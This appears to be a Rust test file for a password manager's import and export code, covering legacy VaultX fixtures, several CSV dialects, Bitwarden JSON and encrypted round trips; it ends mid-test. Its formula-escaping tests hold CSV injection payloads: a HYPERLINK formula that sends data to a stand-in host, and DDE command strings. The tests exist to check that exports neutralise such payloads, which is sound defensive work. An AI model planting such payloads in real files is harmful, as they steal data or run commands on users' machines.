//! Import/export: legacy VaultX 1.x fixtures (generated independently with
//! Python, see tests/fixtures), CSV dialects, Bitwarden JSON and round trips.

use std::fs;
use std::path::{Path, PathBuf};

use keystead_core::export::{
    export_bitwarden_json, export_csv, export_encrypted_with_params, export_to_file,
};
use keystead_core::format::VaultFile;
use keystead_core::import::{
    import_bitwarden_json, import_csv, import_into, import_keystead_export, import_legacy_file,
    legacy_scan_dir,
};
use keystead_core::model::{
    CardData, CustomField, FieldKind, Folder, GeneratedPassword, IdentityData, ItemType, LoginData,
    LoginUri, PasswordHistoryEntry, UriMatch, VaultData, VaultItem,
};
use keystead_core::{Error, KdfParams, VaultStore};
use serde_json::{json, Value};

fn fixture(name: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join(name)
}

fn field<'a>(item: &'a VaultItem, name: &str) -> Option<&'a str> {
    item.fields
        .iter()
        .find(|f| f.name == name)
        .map(|f| f.value.as_str())
}

fn login_of(item: &VaultItem) -> &LoginData {
    item.login.as_ref().expect("login data")
}

// ---------------------------------------------------------------------------
// Legacy VaultX 1.x
// ---------------------------------------------------------------------------

#[test]
fn legacy_v2_with_mac() {
    let (items, warnings) =
        import_legacy_file(&fixture("legacy_v2.json"), "Korrekt-Pferd-42!").unwrap();
    assert_eq!(items.len(), 3);
    assert!(
        warnings.iter().any(|w| w.contains("TotpSecret")),
        "{warnings:?}"
    );

    let gh = &items[0];
    assert_eq!(gh.item_type, ItemType::Login);
    assert_eq!(gh.name, "GitHub");
    assert_eq!(login_of(gh).username, "octocat");
    assert_eq!(login_of(gh).password, "gh-Pa$$w0rd<&>'\"");
    assert_eq!(login_of(gh).uris.len(), 1);
    assert_eq!(login_of(gh).uris[0].uri, "https://github.com/login");
    assert_eq!(login_of(gh).uris[0].match_type, UriMatch::Domain);
    assert_eq!(gh.notes, "Zeile 1\nZeile 2 – äöü ß");
    assert!(gh.fields.is_empty());
    // 2024-01-15T10:30:00 (no zone → UTC)
    assert_eq!(gh.updated_at, 1_705_314_600_000);
    assert_eq!(gh.created_at, gh.updated_at);

    // E-mail used as username; phone and "other" become custom fields.
    let mail = &items[1];
    assert_eq!(login_of(mail).username, "max@example.com");
    assert_eq!(login_of(mail).password, "mail pass with spaces ");
    assert_eq!(login_of(mail).uris[0].uri, "mail.example.com");
    assert_eq!(field(mail, "E-Mail"), None);
    assert_eq!(field(mail, "Telefon"), Some("+49 30 123456"));
    assert_eq!(field(mail, "Sonstiges"), Some("PIN 1234"));

    // Username present → e-mail kept as field; no URL → no URIs.
    let bank = &items[2];
    assert_eq!(login_of(bank).username, "max.muster");
    assert_eq!(field(bank, "E-Mail"), Some("max@bank.example"));
    assert!(login_of(bank).uris.is_empty());
    assert_eq!(bank.updated_at, 1_700_000_000_000);

    assert!(matches!(
        import_legacy_file(&fixture("legacy_v2.json"), "wrong"),
        Err(Error::WrongPassword)
    ));
}

#[test]
fn legacy_v1_without_mac() {
    let (items, warnings) =
        import_legacy_file(&fixture("legacy_v1.json"), "altes-passwort").unwrap();
    assert!(warnings.is_empty());
    let names: Vec<_> = items.iter().map(|i| i.name.as_str()).collect();
    assert_eq!(names, ["Forum", "Router"]);
    assert_eq!(login_of(&items[1]).password, "admin-pw");
    assert_eq!(login_of(&items[1]).uris[0].uri, "http://192.168.0.1");
    assert!(matches!(
        import_legacy_file(&fixture("legacy_v1.json"), "falsch"),
        Err(Error::WrongPassword)
    ));
}

#[test]
fn legacy_recovery_password() {
    let path = fixture("legacy_recovery.json");
    let (by_master, _) = import_legacy_file(&path, "master-pw").unwrap();
    let (by_recovery, _) = import_legacy_file(&path, "Wiederherstellung-2024").unwrap();
    assert_eq!(by_master.len(), 1);
    assert_eq!(by_master[0].name, "Netflix");
    assert_eq!(login_of(&by_master[0]).password, "n3tfl1x");
    assert_eq!(by_master[0].name, by_recovery[0].name);
    assert_eq!(by_master[0].login, by_recovery[0].login);
    assert!(matches!(
        import_legacy_file(&path, "neither"),
        Err(Error::WrongPassword)
    ));
}

#[test]
fn legacy_single_entry_object_with_bom() {
    let (items, _) = import_legacy_file(&fixture("legacy_single_entry.json"), "einzel").unwrap();
    assert_eq!(items.len(), 1);
    assert_eq!(items[0].name, "Einzig");
    assert_eq!(items[0].notes, "Nur ein Eintrag");
    assert_eq!(login_of(&items[0]).username, "solo");
}

#[test]
fn legacy_empty_vault() {
    let (items, warnings) =
        import_legacy_file(&fixture("legacy_v1_empty.json"), "anything").unwrap();
    assert!(items.is_empty());
    assert!(warnings.is_empty());
}

#[test]
fn legacy_tampering_and_errors() {
    let dir = tempfile::tempdir().unwrap();
    let text = fs::read_to_string(fixture("legacy_v2.json")).unwrap();
    let mut meta: Value = serde_json::from_str(text.trim_start_matches('\u{feff}')).unwrap();
    let data = meta["Data"].as_str().unwrap().to_owned();
    let mut bytes = keystead_core::crypto::b64_decode(&data).unwrap();
    bytes[10] ^= 0x80;
    meta["Data"] = Value::String(keystead_core::crypto::b64_encode(&bytes));
    let tampered = dir.path().join("tampered.json");
    fs::write(&tampered, serde_json::to_vec(&meta).unwrap()).unwrap();
    // HMAC mismatch is reported like a wrong password (as VaultX 1.x did).
    assert!(matches!(
        import_legacy_file(&tampered, "Korrekt-Pferd-42!"),
        Err(Error::WrongPassword)
    ));

    // A v2 file without Mac is invalid.
    meta["Data"] = Value::String(data);
    meta.as_object_mut().unwrap().remove("Mac");
    fs::write(&tampered, serde_json::to_vec(&meta).unwrap()).unwrap();
    assert!(matches!(
        import_legacy_file(&tampered, "Korrekt-Pferd-42!"),
        Err(Error::Corrupt(_))
    ));

    // Absurd iteration counts are refused before deriving anything.
    meta["Iterations"] = json!(2_000_000_000u64);
    fs::write(&tampered, serde_json::to_vec(&meta).unwrap()).unwrap();
    assert!(matches!(
        import_legacy_file(&tampered, "x"),
        Err(Error::Unsupported(_))
    ));

    fs::write(&tampered, b"{\"hello\":1}").unwrap();
    assert!(matches!(
        import_legacy_file(&tampered, "x"),
        Err(Error::Unsupported(_))
    ));
    assert!(matches!(
        import_legacy_file(&dir.path().join("missing.json"), "x"),
        Err(Error::NotFound(_))
    ));
}

#[test]
fn legacy_scan_reads_accounts_and_vault_files() {
    let dir = tempfile::tempdir().unwrap();
    let d = dir.path();
    fs::copy(fixture("legacy_accounts.json"), d.join("accounts.json")).unwrap();
    fs::copy(
        fixture("legacy_v2.json"),
        d.join("vault_Privat_1A2B3C4D.json"),
    )
    .unwrap();
    fs::write(d.join("vault_Kaputt_00000000.json"), b"not json").unwrap();
    fs::copy(
        fixture("legacy_v1.json"),
        d.join("vault_Extra_DEADBEEF.json"),
    )
    .unwrap();
    // Without AccountName the name comes from the file name.
    let text = fs::read_to_string(fixture("legacy_v1.json")).unwrap();
    let mut meta: Value = serde_json::from_str(text.trim_start_matches('\u{feff}')).unwrap();
    meta.as_object_mut().unwrap().remove("AccountName");
    fs::write(
        d.join("vault_Ohne_Name_12345678.json"),
        serde_json::to_vec(&meta).unwrap(),
    )
    .unwrap();
    fs::write(d.join("settings.json"), b"{}").unwrap();

    let found = legacy_scan_dir(d);
    let names: Vec<_> = found.iter().map(|v| v.name.as_str()).collect();
    assert_eq!(names, ["Privat", "Alt", "Ohne Name"]);
    assert!(found[0].path.ends_with("vault_Privat_1A2B3C4D.json"));
    let (items, _) = import_legacy_file(Path::new(&found[0].path), "Korrekt-Pferd-42!").unwrap();
    assert_eq!(items.len(), 3);

    // accounts.json holding a single object (PowerShell quirk).
    let dir2 = tempfile::tempdir().unwrap();
    fs::copy(
        fixture("legacy_accounts_single.json"),
        dir2.path().join("accounts.json"),
    )
    .unwrap();
    fs::copy(
        fixture("legacy_single_entry.json"),
        dir2.path().join("vault_Nur_Eins_ABCDEF12.json"),
    )
    .unwrap();
    let found = legacy_scan_dir(dir2.path());
    assert_eq!(found.len(), 1);
    assert_eq!(found[0].name, "Nur Eins");

    assert!(legacy_scan_dir(&d.join("missing")).is_empty());
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

#[test]
fn csv_chrome_edge() {
    let csv = "name,url,username,password,note\r\n\
               github.com,https://github.com/login,octocat,gh-pass,\r\n\
               example.com,https://example.com/,\"user, with comma\",\"pa\"\"ss\",\"multi\nline\"\r\n\
               ,,,,\r\n";
    let (items, folders, warnings) = import_csv(csv).unwrap();
    assert!(folders.is_empty());
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(items.len(), 2);
    assert_eq!(items[0].name, "github.com");
    assert_eq!(login_of(&items[0]).uris[0].uri, "https://github.com/login");
    assert_eq!(login_of(&items[1]).username, "user, with comma");
    assert_eq!(login_of(&items[1]).password, "pa\"ss");
    assert_eq!(items[1].notes, "multi\nline");
}

#[test]
fn csv_firefox() {
    let csv = "\"url\",\"username\",\"password\",\"httpRealm\",\"formActionOrigin\",\"guid\",\"timeCreated\",\"timeLastUsed\",\"timePasswordChanged\"\n\
               \"https://accounts.firefox.com\",\"me@example.com\",\"ff-pass\",,\"https://accounts.firefox.com\",\"{a}\",\"1700000000000\",\"1700000000000\",\"1710000000000\"\n\
               \"https://www.example.org:8443/x\",\"\",\"only-pw\",,,\"{b}\",\"1700000000000\",\"1700000000000\",\"1700000000000\"\n\
               \"\",\"\",\"\",,,\"{c}\",\"1\",\"1\",\"1\"\n";
    let (items, _, warnings) = import_csv(csv).unwrap();
    assert_eq!(items.len(), 2);
    assert_eq!(items[0].name, "accounts.firefox.com");
    assert_eq!(login_of(&items[0]).username, "me@example.com");
    assert_eq!(items[0].created_at, 1_700_000_000_000);
    assert_eq!(
        login_of(&items[0]).password_revised_at,
        Some(1_710_000_000_000)
    );
    assert_eq!(items[1].name, "www.example.org");
    assert_eq!(login_of(&items[1]).password_revised_at, None);
    assert_eq!(warnings.len(), 1);
    assert!(warnings[0].contains("Row 4"), "{warnings:?}");
}

#[test]
fn csv_bitwarden() {
    let csv = "folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\n\
               Social,1,login,Twitter,,\"PIN: 1234\nRecovery: a: b\",0,\"https://twitter.com,https://x.com\",tw_user,tw_pass,JBSWY3DPEHPK3PXP\n\
               social,,login,Mastodon,,,0,https://mastodon.social,m,m,\n\
               ,,note,My Note,Secret note text,,0,,,,\n\
               ,,,,,,,,,,\n";
    let (items, folders, warnings) = import_csv(csv).unwrap();
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(folders.len(), 1, "folders are merged case-insensitively");
    assert_eq!(folders[0].name, "Social");
    assert_eq!(items.len(), 3);
    let tw = &items[0];
    assert!(tw.favorite);
    assert_eq!(tw.folder_id.as_deref(), Some(folders[0].id.as_str()));
    assert_eq!(items[1].folder_id, tw.folder_id);
    let uris: Vec<_> = login_of(tw).uris.iter().map(|u| u.uri.as_str()).collect();
    assert_eq!(uris, ["https://twitter.com", "https://x.com"]);
    assert_eq!(login_of(tw).totp, "JBSWY3DPEHPK3PXP");
    assert_eq!(field(tw, "PIN"), Some("1234"));
    assert_eq!(field(tw, "Recovery"), Some("a: b"));
    let note = &items[2];
    assert_eq!(note.item_type, ItemType::Note);
    assert!(note.login.is_none());
    assert_eq!(note.notes, "Secret note text");
}

#[test]
fn csv_legacy_semicolon_with_bom() {
    let csv = "\u{feff}Title;URL;User;Password;Email;Phone;Notes;Other\r\n\
               Mail;mail.example.com;;pw1;max@example.com;+49 1;Some notes;PIN\r\n\
               ;;;;;;;\r\n\
               Only a title;;;;;;;\r\n\
               ;https://site.example;bob;pw2;;;;\r\n";
    let (items, _, warnings) = import_csv(csv).unwrap();
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(items.len(), 3);
    let mail = &items[0];
    assert_eq!(mail.name, "Mail");
    assert_eq!(login_of(mail).username, "max@example.com");
    assert_eq!(field(mail, "Telefon"), Some("+49 1"));
    assert_eq!(field(mail, "Sonstiges"), Some("PIN"));
    assert_eq!(mail.notes, "Some notes");
    assert_eq!(items[1].item_type, ItemType::Note);
    assert_eq!(items[1].name, "Only a title");
    // Missing title → URL is used as name (legacy behaviour).
    assert_eq!(items[2].name, "https://site.example");
}

#[test]
fn csv_generic_aliases_and_excel_hint() {
    let csv = "sep=;\nWebsite;Login;Pass;Comment;TOTP;Group;Fav\nexample.com;u;p;c;JBSWY3DPEHPK3PXP;Work;1\n";
    let (items, folders, _) = import_csv(csv).unwrap();
    assert_eq!(items.len(), 1);
    let i = &items[0];
    assert_eq!(i.name, "example.com");
    assert_eq!(login_of(i).username, "u");
    assert_eq!(login_of(i).password, "p");
    assert_eq!(login_of(i).totp, "JBSWY3DPEHPK3PXP");
    assert_eq!(i.notes, "c");
    assert!(i.favorite);
    assert_eq!(folders.len(), 1);
    assert_eq!(folders[0].name, "Work");

    let tabbed = "name\turl\tusername\tpassword\nA\ta.com\tu\tp\n";
    assert_eq!(import_csv(tabbed).unwrap().0.len(), 1);
}

#[test]
fn csv_errors() {
    assert!(matches!(import_csv(""), Err(Error::InvalidInput(_))));
    assert!(matches!(
        import_csv("\u{feff}\n\n"),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_csv("foo,bar,baz\n1,2,3\n"),
        Err(Error::InvalidInput(_))
    ));
    // Header only → nothing to import, but not an error.
    let (items, _, _) = import_csv("name,url,username,password\n").unwrap();
    assert!(items.is_empty());
}

// ---------------------------------------------------------------------------
// Bitwarden JSON
// ---------------------------------------------------------------------------

fn bitwarden_sample() -> Value {
    json!({
        "encrypted": false,
        "folders": [ { "id": "f1", "name": "Banking" } ],
        "items": [
            {
                "id": "i1", "organizationId": null, "folderId": "f1", "type": 1, "reprompt": 0,
                "name": "Bank", "notes": null, "favorite": true,
                "fields": [
                    { "name": "PIN", "value": "1234", "type": 1, "linkedId": null },
                    { "name": "Linked", "value": null, "type": 3, "linkedId": 100 },
                    { "name": "Flag", "value": "true", "type": 2, "linkedId": null }
                ],
                "login": {
                    "fido2Credentials": [ { "credentialId": "x" } ],
                    "uris": [
                        { "match": null, "uri": "https://bank.example" },
                        { "match": 3, "uri": "https://bank.example/login" },
                        { "match": 4, "uri": "^https://.*" },
                        { "match": 5, "uri": "https://never.example" }
                    ],
                    "username": "max", "password": "b@nk", "totp": null,
                    "passwordRevisionDate": "2024-03-01T12:00:00.000Z"
                },
                "passwordHistory": [ { "lastUsedDate": "2024-02-01T00:00:00.000Z", "password": "old" } ],
                "revisionDate": "2024-03-01T12:00:00.000Z",
                "creationDate": "2023-01-01T00:00:00.000Z",
                "deletedDate": null
            },
            {
                "id": "i2", "type": 3, "name": "Visa", "favorite": false, "folderId": null,
                "card": { "cardholderName": "Max M", "brand": "Visa", "number": "4111111111111111",
                          "expMonth": "3", "expYear": "27", "code": "123" }
            },
            {
                "id": "i3", "type": 4, "name": "Ich",
                "identity": { "title": "Herr", "firstName": "Max", "middleName": "J", "lastName": "Muster",
                              "email": "max@example.com", "ssn": "123-45", "city": "Berlin" }
            },
            { "id": "i4", "type": 2, "name": "Notiz", "notes": "geheim", "secureNote": { "type": 0 } },
            { "id": "i5", "type": 1, "name": "Gelöscht", "deletedDate": "2024-01-01T00:00:00Z",
              "login": { "username": "x" } },
            { "id": "i6", "type": 99, "name": "Future" },
            { "id": "i7", "type": 5, "name": "Server", "sshKey": { "privateKey": "-----BEGIN-----", "publicKey": "ssh-ed25519 AAA", "keyFingerprint": "SHA256:x" } },
            "garbage"
        ]
    })
}

#[test]
fn bitwarden_json_import() {
    let text = serde_json::to_string(&bitwarden_sample()).unwrap();
    let (items, folders, warnings) = import_bitwarden_json(&text).unwrap();
    assert_eq!(
        folders,
        [Folder {
            id: "f1".into(),
            name: "Banking".into()
        }]
    );
    let names: Vec<_> = items.iter().map(|i| i.name.as_str()).collect();
    assert_eq!(names, ["Bank", "Visa", "Ich", "Notiz", "Server"]);

    let bank = &items[0];
    assert!(bank.favorite);
    assert_eq!(bank.folder_id.as_deref(), Some("f1"));
    assert_eq!(bank.notes, "");
    let l = login_of(bank);
    assert_eq!((l.username.as_str(), l.password.as_str()), ("max", "b@nk"));
    assert_eq!(l.totp, "");
    let matches: Vec<_> = l.uris.iter().map(|u| u.match_type).collect();
    assert_eq!(
        matches,
        [
            UriMatch::Domain,
            UriMatch::Exact,
            UriMatch::Domain,
            UriMatch::Never
        ]
    );
    assert_eq!(l.password_revised_at, Some(1_709_294_400_000));
    assert_eq!(bank.created_at, 1_672_531_200_000);
    assert_eq!(bank.password_history.len(), 1);
    assert_eq!(bank.password_history[0].password, "old");
    assert_eq!(bank.fields.len(), 2);
    assert_eq!(bank.fields[0].kind, FieldKind::Hidden);
    assert_eq!(bank.fields[1].kind, FieldKind::Boolean);

    let card = items[1].card.as_ref().unwrap();
    assert_eq!(card.exp_month, "03");
    assert_eq!(card.exp_year, "2027");
    assert_eq!(card.code, "123");

    let ident = &items[2];
    let id = ident.identity.as_ref().unwrap();
    assert_eq!(id.first_name, "Max");
    assert_eq!(id.city, "Berlin");
    assert_eq!(field(ident, "Zweiter Vorname"), Some("J"));
    assert_eq!(
        ident
            .fields
            .iter()
            .find(|f| f.name == "Sozialversicherungsnummer")
            .map(|f| f.kind),
        Some(FieldKind::Hidden)
    );
    assert_eq!(items[3].item_type, ItemType::Note);
    assert_eq!(items[3].notes, "geheim");
    assert_eq!(items[4].item_type, ItemType::Note);
    assert_eq!(field(&items[4], "Public Key"), Some("ssh-ed25519 AAA"));

    let joined = warnings.join("\n");
    assert!(joined.contains("regular-expression"), "{joined}");
    assert!(joined.contains("passkeys"), "{joined}");
    assert!(joined.contains("trash"), "{joined}");
    assert!(joined.contains("unsupported item type 99"), "{joined}");
    assert!(joined.contains("SSH"), "{joined}");
}

#[test]
fn bitwarden_json_errors() {
    assert!(matches!(
        import_bitwarden_json("{\"encrypted\":true,\"items\":[]}"),
        Err(Error::Unsupported(_))
    ));
    assert!(matches!(
        import_bitwarden_json("not json"),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_bitwarden_json("{\"folders\":[]}"),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_bitwarden_json("[1,2]"),
        Err(Error::InvalidInput(_))
    ));
    let (items, _, _) = import_bitwarden_json("\u{feff}{\"items\":[]}").unwrap();
    assert!(items.is_empty());
}

// ---------------------------------------------------------------------------
// Round trips
// ---------------------------------------------------------------------------

fn sample_data() -> VaultData {
    let folder = Folder {
        id: "fold-1".into(),
        name: "Privat".into(),
    };
    let login = VaultItem {
        id: "item-1".into(),
        item_type: ItemType::Login,
        name: "Konto, \"Haupt\"".into(),
        folder_id: Some(folder.id.clone()),
        favorite: true,
        notes: "Zeile 1\nZeile 2".into(),
        login: Some(LoginData {
            username: "max@example.com".into(),
            password: "p,a;s\"s\nw".into(),
            uris: vec![
                LoginUri {
                    uri: "https://example.com".into(),
                    match_type: UriMatch::Domain,
                },
                LoginUri {
                    uri: "https://login.example.com/x".into(),
                    match_type: UriMatch::StartsWith,
                },
                LoginUri {
                    uri: "example.com:8443".into(),
                    match_type: UriMatch::Host,
                },
                LoginUri {
                    uri: "https://e.example/".into(),
                    match_type: UriMatch::Exact,
                },
                LoginUri {
                    uri: "https://n.example/".into(),
                    match_type: UriMatch::Never,
                },
            ],
            totp: "otpauth://totp/x?secret=JBSWY3DPEHPK3PXP".into(),
            password_revised_at: Some(1_700_000_123_456),
        }),
        fields: vec![
            CustomField {
                name: "PIN".into(),
                value: "1234".into(),
                kind: FieldKind::Hidden,
            },
            CustomField {
                name: "Notiz".into(),
                value: "frei".into(),
                kind: FieldKind::Text,
            },
            CustomField {
                name: "Aktiv".into(),
                value: "true".into(),
                kind: FieldKind::Boolean,
            },
        ],
        password_history: vec![PasswordHistoryEntry {
            password: "alt".into(),
            replaced_at: 1_690_000_000_001,
        }],
        created_at: 1_600_000_000_000,
        updated_at: 1_700_000_123_456,
        deleted_at: None,
        card: None,
        identity: None,
    };
    let note = VaultItem {
        id: "item-2".into(),
        item_type: ItemType::Note,
        name: "Notiz".into(),
        notes: "geheim; mit, Zeichen".into(),
        created_at: 1_600_000_000_000,
        updated_at: 1_600_000_000_000,
        ..Default::default()
    };
    let card = VaultItem {
        id: "item-3".into(),
        item_type: ItemType::Card,
        name: "Visa".into(),
        card: Some(CardData {
            cardholder_name: "Max Muster".into(),
            brand: "Visa".into(),
            number: "4111111111111111".into(),
            exp_month: "03".into(),
            exp_year: "2027".into(),
            code: "123".into(),
        }),
        created_at: 1_600_000_000_000,
        updated_at: 1_600_000_000_000,
        ..Default::default()
    };
    let identity = VaultItem {
        id: "item-4".into(),
        item_type: ItemType::Identity,
        name: "Ich".into(),
        identity: Some(IdentityData {
            title: "Dr.".into(),
            first_name: "Max".into(),
            last_name: "Muster".into(),
            email: "max@example.com".into(),
            phone: "+49".into(),
            company: "ACME".into(),
            address1: "Str. 1".into(),
            address2: "Hinterhaus".into(),
            postal_code: "10115".into(),
            city: "Berlin".into(),
            state: "BE".into(),
            country: "DE".into(),
            username: "maxm".into(),
        }),
        created_at: 1_600_000_000_000,
        updated_at: 1_600_000_000_000,
        ..Default::default()
    };
    let trashed = VaultItem {
        id: "item-5".into(),
        item_type: ItemType::Note,
        name: "Im Papierkorb".into(),
        deleted_at: Some(1_700_000_000_000),
        created_at: 1,
        updated_at: 1,
        ..Default::default()
    };
    VaultData {
        items: vec![login, note, card, identity, trashed],
        folders: vec![folder],
        generator_history: vec![GeneratedPassword {
            password: "generated-secret".into(),
            created_at: 1,
        }],
    }
}

#[test]
fn bitwarden_json_round_trip() {
    let data = sample_data();
    let text = export_bitwarden_json(&data);
    let v: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(v["encrypted"], false);
    assert_eq!(v["items"].as_array().unwrap().len(), 4);
    assert!(!text.contains("Im Papierkorb"));
    assert!(!text.contains("generated-secret"));
    let (items, folders, warnings) = import_bitwarden_json(&text).unwrap();
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(folders, data.folders);
    assert_eq!(items, data.items[..4]);
}

#[test]
fn csv_round_trip() {
    let data = sample_data();
    let text = export_csv(&data);
    assert!(text.starts_with(
        "folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp"
    ));
    assert!(!text.contains("Im Papierkorb"));
    assert!(
        !text.contains("4111111111111111"),
        "cards are not exported to CSV"
    );
    let (items, folders, warnings) = import_csv(&text).unwrap();
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(items.len(), 2);
    assert_eq!(folders.len(), 1);
    assert_eq!(folders[0].name, "Privat");

    let orig = &data.items[0];
    let back = &items[0];
    assert_eq!(back.name, orig.name);
    assert_eq!(back.notes, orig.notes);
    assert!(back.favorite);
    assert_eq!(back.folder_id.as_deref(), Some(folders[0].id.as_str()));
    let (ol, bl) = (login_of(orig), login_of(back));
    assert_eq!(bl.username, ol.username);
    assert_eq!(bl.password, ol.password);
    assert_eq!(bl.totp, ol.totp);
    let uris: Vec<_> = bl.uris.iter().map(|u| u.uri.clone()).collect();
    let orig_uris: Vec<_> = ol.uris.iter().map(|u| u.uri.clone()).collect();
    assert_eq!(uris, orig_uris);
    let fields: Vec<_> = back
        .fields
        .iter()
        .map(|f| (f.name.clone(), f.value.clone()))
        .collect();
    let orig_fields: Vec<_> = orig
        .fields
        .iter()
        .map(|f| (f.name.clone(), f.value.clone()))
        .collect();
    assert_eq!(fields, orig_fields);

    assert_eq!(items[1].item_type, ItemType::Note);
    assert_eq!(items[1].notes, data.items[1].notes);
}

/// Data rows of a CSV text, by column name.
fn csv_rows(text: &str) -> Vec<std::collections::HashMap<String, String>> {
    let mut reader = csv::Reader::from_reader(text.as_bytes());
    let headers: Vec<String> = reader
        .headers()
        .unwrap()
        .iter()
        .map(str::to_owned)
        .collect();
    reader
        .records()
        .map(|r| {
            headers
                .iter()
                .cloned()
                .zip(r.unwrap().iter().map(str::to_owned))
                .collect()
        })
        .collect()
}

fn formula_login(name: &str, username: &str, password: &str) -> VaultItem {
    VaultItem {
        id: format!("id-{name}"),
        item_type: ItemType::Login,
        name: name.into(),
        login: Some(LoginData {
            username: username.into(),
            password: password.into(),
            ..Default::default()
        }),
        ..Default::default()
    }
}

/// Values a malicious website (save-login prompt) or an imported file put
/// into the vault must not become spreadsheet formulas in a CSV export.
fn formula_data() -> VaultData {
    let mut evil = formula_login(
        "=HYPERLINK(\"https://evil.example/?p=\"&J3,\"Open\")",
        "=HYPERLINK(\"x\")",
        "=pw",
    );
    evil.folder_id = Some("f1".into());
    evil.notes = "-1+1".into();
    evil.fields = vec![
        CustomField {
            name: "=f".into(),
            value: "=v".into(),
            kind: FieldKind::Text,
        },
        CustomField {
            name: "ok".into(),
            value: "@x".into(),
            kind: FieldKind::Text,
        },
    ];
    if let Some(l) = evil.login.as_mut() {
        l.uris = vec![LoginUri {
            uri: "=cmd|' /C calc'!A0".into(),
            match_type: UriMatch::Domain,
        }];
        l.totp = "=t".into();
    }
    let mut phone = formula_login("Phone", "+4912345", "-pw");
    phone.notes = "\t=x".into();
    let mut quoted = formula_login("'=already", "@handle", "@SUM(1+1)*cmd|' /C calc'!A0");
    quoted.notes = "'plain".into();
    let dash = formula_login("Dash", "-user", " =spaced");
    VaultData {
        items: vec![evil, phone, quoted, dash],
        folders: vec![Folder {
            id: "f1".into(),
            name: "@team".into(),
        }],
        generator_history: vec![],
    }
}

#[test]
fn csv_export_neutralises_formulas() {
    let text = export_csv(&formula_data());
    assert!(text.contains("\"'=HYPERLINK(\"\"https://evil.example/"));
    let rows = csv_rows(&text);
    assert_eq!(rows.len(), 4);
    let r = &rows[0];
    assert_eq!(r["folder"], "'@team");
    assert_eq!(
        r["name"],
        "'=HYPERLINK(\"https://evil.example/?p=\"&J3,\"Open\")"
    );
    assert_eq!(r["notes"], "'-1+1");
    assert_eq!(r["fields"], "'=f: =v\nok: @x");
    assert_eq!(r["login_uri"], "'=cmd|' /C calc'!A0");
    assert_eq!(r["login_username"], "'=HYPERLINK(\"x\")");
    // Secrets are exported unchanged (other managers must import them).
    assert_eq!(r["login_password"], "=pw");
    assert_eq!(r["login_totp"], "=t");
    let r = &rows[1];
    assert_eq!(r["login_username"], "+4912345", "phone numbers stay");
    assert_eq!(r["login_password"], "-pw");
    assert_eq!(r["notes"], "'\t=x");
    let r = &rows[2];
    assert_eq!(r["name"], "''=already");
    assert_eq!(r["login_username"], "'@handle");
    assert_eq!(r["login_password"], "@SUM(1+1)*cmd|' /C calc'!A0");
    assert_eq!(r["notes"], "'plain");
    let r = &rows[3];
    assert_eq!(r["login_username"], "-user");
    assert_eq!(r["login_password"], " =spaced");
    for r in &rows {
        for column in ["folder", "name", "notes", "fields", "login_uri"] {
            let v = r[column].trim_start();
            assert!(
                !v.starts_with(['=', '+', '-', '@']) && !r[column].starts_with(['\t', '\r']),
                "{column}: {v:?}"
            );
        }
        assert!(!r["login_username"].trim_start().starts_with(['=', '@']));
    }
}

#[test]
fn csv_formula_escaping_round_trips() {
    let data = formula_data();
    let (items, folders, warnings) = import_csv(&export_csv(&data)).unwrap();
    assert!(warnings.is_empty(), "{warnings:?}");
    assert_eq!(folders.len(), 1);
    assert_eq!(folders[0].name, "@team");
    assert_eq!(items.len(), data.items.len());
    for (back, orig) in items.iter().zip(&data.items) {
        assert_eq!(back.name, orig.name);
        assert_eq!(back.notes, orig.notes);
        let (bl, ol) = (login_of(back), login_of(orig));
        assert_eq!(bl.username, ol.username);
        assert_eq!(bl.password, ol.password);
        assert_eq!(bl.totp, ol.totp);
        let uris: Vec<_> = bl.uris.iter().map(|u| u.uri.as_str()).collect();
        let orig_uris: Vec<_> = ol.uris.iter().map(|u| u.uri.as_str()).collect();
        assert_eq!(uris, orig_uris);
        let fields: Vec<_> = back
            .fields
            .iter()
            .map(|f| (f.name.as_str(), f.value.as_str()))
            .collect();
        let orig_fields: Vec<_> = orig
            .fields
            .iter()
            .map(|f| (f.name.as_str(), f.value.as_str()))
            .collect();
        assert_eq!(fields, orig_fields);
    }
    assert_eq!(items[0].folder_id.as_deref(), Some(folders[0].id.as_str()));
}

#[test]
fn encrypted_export_round_trip() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("backup.keystead");
    let data = sample_data();
    export_encrypted_with_params(&data, &path, "export-pw", KdfParams::insecure_for_tests())
        .unwrap();
    let file = VaultFile::read(&path).unwrap();
    assert_eq!(file.name, "backup");
    let (items, folders) = import_keystead_export(&path, "export-pw").unwrap();
    assert_eq!(items, data.items[..4]);
    assert_eq!(folders, data.folders);
    // Generator history is never exported.
    let key = file.unwrap_key("export-pw").unwrap();
    assert!(file
        .decrypt_payload(&key)
        .unwrap()
        .generator_history
        .is_empty());
    assert!(matches!(
        import_keystead_export(&path, "wrong"),
        Err(Error::WrongPassword)
    ));
    assert!(matches!(
        export_encrypted_with_params(&data, &path, "", KdfParams::insecure_for_tests()),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_keystead_export(&fixture("legacy_v2.json"), "x"),
        Err(Error::Unsupported(_))
    ));
}

#[test]
fn import_into_vault_and_export_files() {
    let dir = tempfile::tempdir().unwrap();
    let store = VaultStore::new(dir.path().join("data"));
    let mut vault = store
        .create_vault_with_params("Ziel", "pw", KdfParams::insecure_for_tests())
        .unwrap();
    let existing = vault
        .save_folder(Folder {
            id: String::new(),
            name: "social".into(),
        })
        .unwrap();

    let csv_path = dir.path().join("bw.csv");
    // Windows-1252 encoded file (as Excel writes it) with an umlaut.
    let mut csv_bytes = b"folder,favorite,type,name,notes,fields,reprompt,login_uri,login_username,login_password,login_totp\r\n".to_vec();
    csv_bytes.extend_from_slice(
        b"Social,,login,M\xfcnchen,,,0,https://m.example,u,p,\r\n,,,,,,,,,,\r\n",
    );
